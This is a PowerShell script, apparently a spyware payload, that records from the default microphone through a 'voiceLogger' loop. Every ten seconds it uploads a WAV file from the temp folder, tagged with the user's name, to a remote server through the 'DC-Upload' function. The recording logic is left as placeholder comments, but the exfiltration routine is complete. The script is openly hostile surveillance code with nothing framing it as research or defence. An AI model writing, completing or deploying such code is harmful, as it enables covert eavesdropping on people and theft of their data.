function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$filePath
    )

    $dc = 'http://localhost:8000'
    
    if (-not ([string]::IsNullOrEmpty($filePath)) -and (Test-Path $filePath)) {
        $Body = @{
            'username' = $env:username
        }
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"

        $fileHeader = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
Content-Type: application/octet-stream

"@
        $fileFooter = "--$boundary--"

        $bodyBytes = ([Text.Encoding]::UTF8.GetBytes($fileHeader) + $fileBytes + [Text.Encoding]::UTF8.GetBytes($fileFooter))
        
        Invoke-RestMethod -ContentType $contentType -Uri $dc -Method Post -Body $bodyBytes
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    $waveFilePath = "$env:tmp\VoiceLog.wav"

    # Record audio (replace with actual recording logic)
    # Example: Using Windows Voice Recorder or any other method to save WAV file to $waveFilePath

    while ($true) {
        # This is a placeholder for recording logic.
        # You need to ensure the $waveFilePath is properly created and populated.
        
        if (Test-Path $waveFilePath) {
            # Send the WAV file to the server
            DC-Upload $waveFilePath

            # Optional: Remove the WAV file after upload
            # Remove-Item $waveFilePath

            # Handle voice commands
            $result = $recognizer.Recognize()
            if ($result) {
                Write-Output $result.Text
                switch -regex ($result.Text) {
                    '\bnote\b' {Start-Process notepad}
                    '\bexit\b' {break}
                }
            }
        } else {
            Write-Host "Error: The audio file was not found."
        }

        Start-Sleep -Seconds 10  # Sleep to avoid high CPU usage, adjust as needed
    }
}

voiceLogger
